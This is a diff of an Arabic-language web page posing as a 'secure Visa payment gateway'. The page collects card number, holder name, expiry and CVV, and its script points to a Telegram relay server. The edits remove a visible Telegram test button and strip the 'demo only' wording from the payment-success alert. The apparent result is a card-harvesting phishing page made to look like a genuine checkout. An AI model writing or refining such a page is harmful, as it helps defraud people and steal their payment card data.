@@ -214,9 +214,6 @@
   </style>
 </head>
 <body> 
-<button id="sendTelegram">إرسال رسالة إلى Telegram</button>
-<p id="telegramStatus" role="status"></p>
-
 <script>
   const serverUrl =
     "https://telegram-server-production-7af4.up.railway.app";
@@ -245,16 +242,13 @@
     }
   });
 </script>
-
 </body>
-
   <div class="payment-wrapper" dir="rtl">
     <div class="form-card">
       <div class="brand">
         <img src="https://alshafaqstore-uae.com/assets/images/visa.png" alt="Visa" />
         <h2>بوابة الدفع الآمنة — Visa</h2>
       </div>
-
       <form id="paymentForm" novalidate>
         <div class="field">
           <label class="label" for="cardNumber">رقم البطاقة</label>
@@ -265,27 +259,23 @@
           </div>
           <div id="cardNumberError" class="error-msg"></div>
         </div>
-
         <div class="field">
           <label class="label" for="cardHolder">اسم حامل البطاقة</label>
           <input id="cardHolder" class="form-input" type="text" placeholder="الاسم كما هو على البطاقة" autocomplete="cc-name" />
           <div id="cardHolderError" class="error-msg"></div>
         </div>
-
         <div class="split">
           <div class="field">
             <label class="label" for="expiryDateInput">تاريخ الانتهاء</label>
             <input id="expiryDateInput" class="form-input" type="text" inputmode="numeric" maxlength="5" placeholder="MM/YY" />
             <div id="expiryDateError" class="error-msg"></div>
           </div>
-
           <div class="field">
             <label class="label" for="cvv">CVV</label>
             <input id="cvv" class="form-input" type="tel" inputmode="numeric" maxlength="4" placeholder="•••" />
             <div id="cvvError" class="error-msg"></div>
           </div>
         </div>
-
         <label class="terms" for="termsCheckbox">
           <input type="checkbox" id="termsCheckbox" />
           <span>أوافق على <a href="#">الشروط والأحكام</a> و <a href="#">سياسة الخصوصية</a></span>
@@ -428,7 +418,7 @@
       }
 
       if (valid) {
-        alert('تمت معالجة الدفع بنجاح (عرض توضيحي فقط).');
+        alert('تمت معالجة الدفع بنجاح ).');
       }
     });
   </script>
